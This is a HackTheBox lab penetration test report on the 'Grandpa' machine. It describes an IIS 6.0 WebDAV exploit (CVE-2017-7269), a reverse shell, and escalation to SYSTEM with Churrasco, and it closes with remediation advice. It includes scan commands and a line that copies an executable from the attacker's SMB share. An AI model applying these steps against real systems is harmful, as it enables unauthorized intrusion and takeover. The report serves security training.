# HTB Grandpa - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2025-11-27

**Target:** 10.129.95.233

**Environment:** HTB Grandpa (Retired Machine)

---

## 0. Lesson Learned

You must always keep pivoting, especially when exploits that should work don't. 

---

## 1. Executive Summary

This assessment evaluated the security posture of the target Windows host known as **Grandpa**. During the engagement, multiple critical vulnerabilities were identified, leading to complete system compromise.

Key findings include:

- The target exposed is **IIS 6.0**, an outdated and unsupported web server.
- The server was vulnerable to a known remote code execution flaw (**CVE-2017-7269**) triggered via a malicious *PROPFIND* request.
- Post-exploitation enumeration revealed the **SeImpersonatePrivilege** privilege on the compromised account.
- Privilege escalation was achieved successfully through the **Churrasco** token impersonation technique, granting full **NT AUTHORITY\SYSTEM** control of the host.

At the conclusion of the testing, both **user.txt** and **root.txt** were retrieved, demonstrating full compromise of the system.

---

## 2. Scope

- **Target:** 10.129.95.233
- **Environment:** Isolated penetration testing lab
- **Testing Window:** 2025-11-25 to 2025-11-27
- **Objective:** Obtain user-level and administrative-level access

---

## 3. Methodology

The assessment followed OSCP best-practice methodology:

1. Information Gathering
2. Enumeration
3. Vulnerability Identification
4. Exploitation
5. Post-Exploitation Enumeration
6. Privilege Escalation
7. Capture of Proof Files

---

## 4. Information Gathering

### 4.1 Nmap Scan

A full TCP port scan was conducted:

```
nmap -p- -sCV 10.129.95.233 -T4 -oA grandpa_initial
```

Results:

- Port **80/tcp** open
- Service: **Microsoft IIS 6.0** (Windows Server 2003)

This version is known to contain multiple critical vulnerabilities.

---

## 5. Enumeration

### 5.1 Web Enumeration

Gobuster was used to enumerate directories.

```
gobuster dir -u http://10.129.95.233 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Discovered:

- `/images` - directory listing denied
- `/_private` - 403 Forbidden

No direct browsing access, but findings suggested **WebDAV** behavior.

### 5.2 Technology identification

IIS 6.0 combined with directory behavior indicated potential for **WebDAV exploitation** and known RCE vulnerabilities.

---

## 6. Exploitation

### 6.1 Attempted WebDAV Upload Techniques

Initial attempts involved testing Exploit-DB scripts:

- EDB 8765
- EDB 8806

These attempts were partially successful but did not yield a stable foothold.

### 6.2 Successful Exploit: CVE-2017-7269 (IIS 6.0 PROPFIND RCE)

A publicly documented PoC for **CVE-2017-7269** was used to deliver a reverse shell to the attacker host.

Upon exploitation, a reverse shell as `nt authority\network service` was obtained.

---

## 7. Post-Exploitation Enumeration

### 7.1 System Identification

`systeminfo` revealed the host OS as:

- **Windows Server 2003 SP2** (x86)

### 7.2 Privilege Review

`whoami /priv` showed:

- **SeImpersonatePrivilege: Enabled**

This token typically allows token impersonation-based privilege escalation pathways.

---

## 8. Privilege Escalation

### 8.1 Initial Attempts

Multiple transfer methods were tested including `certutil` and `bitsadmin`, but none succeeded due to OS age and missing components.

SMB file transfer via Impacket **smbserver.py** was ultimately successful. Files transferred using:

```
copy \\10.10.14.8\sharename\file.exe
```

PrintSpoofer, an exploit typically successful in **SeImpersonatePrivilege** vulnerabilities, did not work on this machine.

---

### 8.2 Working Escalation: Churrasco

The Churrasco executable (compatible with Server 2003 SeImpersonatePrivilege-based escalation) was uploaded and executed.

Upgraded privileges of `nt authority\system` represented full host compromise.

---

## 9. Proof of Access

Located user and root flags using a recursive search:

```
dir C:\ /s /b | findstr /i user.txt

dir C:\ /s /b | findstr /i root.txt
```

### 9.1 User Flag

Location:

```
C:\Documents and Settings\Harry\Desktop\user.txt
```

Value: *REDACTED*

### 9.2 Root Flag

```
C:\Documents and Settings\Administrator\Desktop\root.txt
```

Value: *REDACTED*

---

## 10. Recommendations

### 1. Decommission or Upgrade IIS 6.0

IIS 6.0 (2003) is end-of-life and contains multiple unpatched RCE vulnerabilities.

### 2. Disable or Restrict WebDAV

If WebDAV is not required, disable it entirely.

### 3. Restrict SeImpersonatePrivilege

This privilege allows significant escalation paths. Ensure only trusted services possess it.

### 4. Apply Strong File Transfer Controls

Legacy hosts lack secure utilities. Modernizing host and enabling PowerShell or secure transfer mechanisms is recommended.

### 5. Implement Network Segmentation

Legacy systems should be placed in isolated VLANs away from critical assets.

---

## 11. Conclusion

The engagement resulted in full compromise of the target machine. Vulnerabilities in outdated IIS WebDAV components (**CVE-2017-7269**) combined with dangerous local privileges (**SeImpersonatePrivilege**) enabled remote code execution and complete administrative takeover.

The existence of these critical issues indicates a high-risk environment requiring immediate remediation.